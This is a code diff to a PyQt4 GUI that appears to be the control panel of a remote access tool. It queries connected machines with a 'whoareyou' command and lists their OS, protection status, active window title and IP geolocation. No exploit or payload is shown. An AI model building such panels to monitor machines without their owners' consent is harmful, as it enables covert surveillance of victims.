@@ -4,6 +4,8 @@ import sys
 import socket
 import pygeoip
 import os
+import time
+import ast
 from threading import Thread
 
 from PyQt4.QtGui import *
@@ -20,6 +22,9 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
 
         # sockets Timeout
         self.timeout = None
+
+        # update gui
+        self.gui = QApplication.processEvents
 
         # unlocked servers bank
         self.unlockedSockets = []
@@ -81,18 +86,30 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
                 return
             if self.sock:
 
-                # Set timeout None
-                self.sock.settimeout(self.timeout)
+                # TEST GET INFO
+                try:
+                    self.Send(self.sock, 'whoareyou')
+                    data = self.Receive(self.sock)
+                    info = ast.literal_eval(data)
 
-                # Save connected socket
-                socketIndex = self.address[1]
-                self.socks[socketIndex] = {}
-                self.socks[socketIndex]['sock'] = self.sock
-                self.socks[socketIndex]['ip_address'] = self.address[0]
-                self.socks[socketIndex]['socket'] = self.address[1]
-                self.socks[socketIndex]['is_protected'] = True
 
-                self.updateServersTable()
+                    # Set timeout None
+                    self.sock.settimeout(self.timeout)
+
+                    # Save connected socket
+                    socketIndex = self.address[1]
+                    self.socks[socketIndex] = {}
+                    self.socks[socketIndex]['sock'] = self.sock
+                    self.socks[socketIndex]['ip_address'] = self.address[0]
+                    self.socks[socketIndex]['socket'] = self.address[1]
+                    self.socks[socketIndex]['ostype'] = info['ostype']
+                    self.socks[socketIndex]['protection'] = info['protection']
+                    self.socks[socketIndex]['os'] = info['os']
+                    self.socks[socketIndex]['activewindowtitle'] = info['activewindowtitle']
+
+                    self.updateServersTable()
+                except:
+                    continue
 
     # Update Servers Table from self.socks
     def updateServersTable(self):
@@ -111,17 +128,22 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
             self.serversTable.setItem(index, self.index_of_socket, item)
 
             # add server lock status
-            item = QTableWidgetItem('LOCKED')
-            item.setTextColor(QColor('red'))
+            lock_status = 'LOCKED' if self.socks[obj]['protection'] == 'False' else 'UNLOCKED'
+            item = QTableWidgetItem(lock_status)
+            if lock_status == 'LOCKED':
+                item.setTextColor(QColor('red'))
+            else:
+                item.setTextColor(QColor('lime'))
             item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
             self.serversTable.setItem(index, self.index_of_lock, item)
 
             # add os version
-            item = QTableWidgetItem('Windows 7 Service pack 3')
+            item = QTableWidgetItem(self.socks[obj]['os'])
+            item.setIcon(QIcon(os.path.join(self.assets, self.osIcon(self.socks[obj]['ostype']))))
             self.serversTable.setItem(index, self.index_of_os, item)
 
             # add active windows title
-            item = QTableWidgetItem('Test Active Window Title')
+            item = QTableWidgetItem(self.socks[obj]['activewindowtitle'])
             item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
             self.serversTable.setItem(index, self.index_of_activeWindowTitle, item)
 
@@ -132,6 +154,13 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
         # update servers online counter
         self.onlineStatus.setText(str(len(self.socks)))
 
+    def osIcon(self, os):
+        if os == "linux" or os == "linux2":
+            return 'linux.png'
+        elif os == "darwin":
+            return 'mac.png'
+        elif os == "win32":
+            return 'windows.png'
 
     def getIpLocation(self, ip):
         try:
@@ -147,6 +176,30 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
     def stopListen(self):
         pass
 
+
+    # send socket
+    def Send(self, Sock, cmd, end="[ENDOFMESSAGE]"):
+        try:
+            Sock.sendall((cmd + end).encode('utf-8'))
+        except socket.error:
+            pass
+
+    # recieve socket
+    def Receive(self, Sock, end="[ENDOFMESSAGE]"):
+        data = ""
+        try:
+            l = Sock.recv(1024)
+            while l:
+                time.sleep(0.1)
+                data += l
+                if data.endswith(end):
+                    break
+                else:
+                    self.gui()
+                    l = Sock.recv(1024)
+        except socket.timeout:
+            pass
+        return data[:-len(end)].decode('utf-8')
 
 # Run Application
 def main():
